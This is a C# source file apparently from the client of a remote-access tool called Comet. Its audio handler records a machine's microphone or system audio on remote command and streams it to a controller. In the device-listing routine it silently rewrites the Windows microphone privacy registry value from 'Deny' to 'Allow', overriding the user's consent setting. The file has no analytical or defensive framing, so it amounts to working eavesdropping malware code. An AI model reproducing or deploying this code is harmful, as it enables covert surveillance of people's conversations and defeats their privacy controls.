using AForge.Video.DirectShow;
using Comet.Common.Messages;
using Comet.Common.Networking;
using Comet.Common.Video;
using Microsoft.Win32;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using NAudioDemo.NetworkChatDemo;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using Comet.Common.Utilities;
using NAudio.Codecs;
using System.Diagnostics;

namespace Comet.Client.Messages
{
    internal class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        static ISender _client;
        internal WaveOut WaveOut = new WaveOut();
        private static WaveInEvent microphone;
        private static WasapiCapture capture;
        internal BufferedWaveProvider BufferedWaveProvider;
        private readonly G722CodecState encoderState = new G722CodecState(64000, G722Flags.None);
        private readonly G722Codec codec = new G722Codec();

        public override bool CanExecute(IMessage message) => message is GetAudioNames||
                                                             message is GetAudioResponse||
                                                             message is DoAudioStop ||
                                                             message is SendMicrophoneInit ||
                                                             message is SendMicrophoneData ||
                                                             message is SendMicrophoneStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioNames msg:
                    Execute(sender, msg);
                    break;
                case GetAudioResponse msg:
                    Execute(sender, msg);
                    break;
                case DoAudioStop msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneInit msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneData msg:
                    Execute(sender, msg);
                    break;
                case SendMicrophoneStop msg:
                    Execute(sender, msg);
                    break;
            }
        }
        

        private void Execute(ISender client, GetAudioNames message)
        {
            _client = client;
            GetAudioNames getAudioNames = new GetAudioNames
            {
                WaveInDeviceName = new Dictionary<string, string>(),
            };
            for (int i = 0; i < WaveIn.DeviceCount; i++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(i);
                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName, "microphone");//添加麦克风
            }
            for (int i = 0; i < WaveOut.DeviceCount; i++)
            {
                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName , "system");//添加系统播放设备
            }
            client.Send(getAudioNames);

            try
            {
                RegistryKey localMachineRegistry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,
                Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
                RegistryKey subKey = localMachineRegistry.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone", true);
                if (subKey != null)
                {
                    string str = (string)subKey.GetValue("Value");
                    if (str == "Deny") subKey.SetValue("Value", "Allow");
                }
            }
            catch (Exception)
            {
            }
        }

        private void Execute(ISender client, GetAudioResponse message)
        {
            G722CodecState encoderState;

            switch (message.IsSystem)
            {
                case true:
                    
                    capture = new WasapiLoopbackCapture();
                    capture.DataAvailable += WaveDataAvailableSys;
                    capture.RecordingStopped += SystemWaveStop;
                    capture.StartRecording();
                    break;
                default:
                    microphone?.StopRecording();
                    microphone = new WaveInEvent();
                    encoderState = new G722CodecState(64000, G722Flags.None);
                    microphone.WaveFormat = new WaveFormat(16000, 1);
                    microphone.DeviceNumber = 0;
                    microphone.DataAvailable += WaveDataAvailableMicro;
                    microphone.RecordingStopped += MicWaveStop;
                    microphone.StartRecording();
                    break;
            }
        }

        void Execute(ISender client, SendMicrophoneInit message)
        {
            _client.Send(new SendMicrophoneInit());
            BufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(16000, 1));
            WaveOut.DeviceNumber = 0;
            WaveOut?.Init(BufferedWaveProvider);
            WaveOut?.Play();
        }

        void Execute(ISender client, SendMicrophoneData message)
        {
            BufferedWaveProvider?.AddSamples(message.Buffer, 0, message.BytesRecorded);
        }

        void Execute(ISender client, SendMicrophoneStop message)
        {
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        private void Execute(ISender client, DoAudioStop message)
        {
            capture?.StopRecording();
            microphone?.StopRecording();
            WaveOut?.Stop();
            BufferedWaveProvider?.ClearBuffer();
        }

        void WaveDataAvailableMicro(object sender, WaveInEventArgs e)
        {
            if (e.Buffer.Length>0 && e.BytesRecorded>0)
            {
                _client.Send(new GetAudioResponse
                {
                    Buffer = EncodeMicro(e.Buffer, 0, e.BytesRecorded),
                    BytesRecorded = e.BytesRecorded
                });
            }
        }
        void WaveDataAvailableSys(object sender, WaveInEventArgs e)
        {
            if (e.Buffer.Length > 0 && e.BytesRecorded > 0)
            {
                _client.Send(new GetAudioResponse
                {
                    Buffer = EncodeSys(e.Buffer, 0, e.BytesRecorded),
                    BytesRecorded = e.BytesRecorded,
                    IsSystem = true
                });
            }
        }
        byte[] EncodeMicro(byte[] data, int offset, int length)
        {
            if (offset != 0)
            {
                throw new ArgumentException("G722 does not yet support non-zero offsets");
            }
            var wb = new WaveBuffer(data);
            int encodedLength = length / 4;
            var outputBuffer = new byte[encodedLength];
            int encoded = codec.Encode(encoderState, outputBuffer, wb.ShortBuffer, length / 2);
            Debug.Assert(encodedLength == encoded);
            return outputBuffer;
        }
        byte[] EncodeSys(byte[] data, int offset, int length)
        {
            var encoded = new byte[length];
            Array.Copy(data, offset, encoded, 0, length);
            return encoded;
        }

        void MicWaveStop(object sender, StoppedEventArgs e)
        {
            microphone.DataAvailable -= null;
            microphone.RecordingStopped -= null;
            microphone?.Dispose();
        }

        void SystemWaveStop(object sender, StoppedEventArgs e)
        {
            capture.DataAvailable -= null;
            capture.RecordingStopped -= null;
            capture?.Dispose();
        }

        //处置与此消息处理程序关联的所有托管和非托管资源。
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }

    }
}
